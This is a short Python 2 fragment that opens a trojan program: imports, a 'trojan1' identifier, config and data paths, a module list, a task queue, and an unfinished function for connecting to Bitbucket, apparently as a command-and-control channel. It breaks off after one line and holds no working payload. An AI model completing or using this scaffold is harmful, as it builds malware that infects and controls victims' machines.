import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import pybitbucket

trojan_id = "trojan1"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()

def connnect_bitbucket():
    bb = login